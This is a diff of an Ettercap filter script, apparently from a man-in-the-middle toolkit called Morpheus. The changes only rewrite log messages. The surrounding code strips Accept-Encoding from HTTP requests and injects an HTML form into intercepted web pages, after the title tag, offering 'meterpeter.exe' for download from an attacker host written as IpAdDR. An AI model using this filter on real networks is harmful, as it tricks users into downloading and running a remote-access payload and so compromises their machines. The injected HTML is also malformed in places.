@@ -21,11 +21,14 @@
 ## Zap Content Encoding ##
 ##########################
 if (ip.proto == TCP && tcp.dst == 80) {
+  msg("[morpheus] host:IpAdDR   [ -> ]  port:80 http ☆");
   if (search(DATA.data, "Accept-Encoding")) {
   replace("Accept-Encoding", "Accept-Nothing!");
-  msg("[Morpheus] Encoding zapped.");
+  msg("[Morpheus] | status: Encoding zapped from request ✔");
   }
 }
+
+
 
 #####################
 ## Replace Content ##
@@ -35,7 +38,7 @@ if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "<title>")) {
     replace("</title>", "</title><form
  action=\"http://IpAdDR/meterpeter.exe\" method=\"link\"><img src=\"http://IpAdDR/alert.gif\"><INPUT TYPE=submit value=\"DOWNLOAD meterpeter.exe\"></form><html><body><h10>just some instructions</h10></body></html>");
-    msg("[Morpheus] malicious url injected...\n");
+    msg("[Morpheus] |_ info : malicious url injected into </title> ✔\n");
   }
 }
 
@@ -43,7 +46,7 @@ if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "<TITLE>")) {
     replace("</TITLE>", "</TITLE><form
  action=\"http://IpAdDR/meterpeter.exe\" method=\"link\"><img src=\"http://IpAdDR/alert.gif\"><INPUT TYPE=submit value=\"DOWNLOAD meterpeter.exe\"></form><html><body><h10>just some instructions</h10></body></html>");
-    msg("[Morpheus] malicious url injected...\n");
+    msg("[Morpheus] |_ info : malicious url injected into </TITLE> ✔\n");
   }
 }
 
